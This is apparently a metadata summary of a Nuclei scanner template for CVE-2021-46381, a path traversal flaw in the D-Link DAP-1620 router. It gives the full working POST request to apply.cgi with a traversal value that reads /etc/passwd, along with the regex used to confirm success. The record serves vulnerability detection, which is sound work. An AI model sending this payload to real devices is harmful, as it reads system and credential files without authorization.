---
cve_id: CVE-2021-46381
template_path: nuclei-templates/http/cves/2021/CVE-2021-46381.yaml
affected_product: D-Link DAP-1620
severity: high
authentication: none
external_callback: false
affected_versions: unknown
preconditions: []
poc_classification: info-leak
---

## Vulnerability
D-Link DAP-1620 is vulnerable to local file inclusion (LFI) via path traversal in the `apply.cgi` endpoint. This allows unauthenticated attackers to read arbitrary internal files such as `/etc/passwd` and `/etc/shadow`.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5 High, CWE-22).

## PoC / Detection
Classification: info-leak

The template issues a single POST request to `{{BaseURL}}/apply.cgi` using the body `action=do_graph_auth&graph_code=94102&html_response_message=just_login&html_response_page=../../../../../../../../../../../../../../etc/passwd&log_pass=DummyPass&login_n=admin&login_name=DummyName&tkn=634855349&tmp_log_pass=DummyPass&tmp_log_pass_auth=DummyPass` and matches the regex `root:.*:0:0:` anywhere in the response body to confirm successful LFI of `/etc/passwd`.

## References
- https://drive.google.com/drive/folders/19OP09msw8l7CJ622nkvnvnt7EKun1eCG?usp=sharing
- https://www.dlink.com/en/security-bulletin/
- https://nvd.nist.gov/vuln/detail/CVE-2021-46381
- http://packetstormsecurity.com/files/167070/DLINK-DAP-1620-A1-1.01-Directory-Traversal.html
- https://github.com/SYRTI/POC_to_review
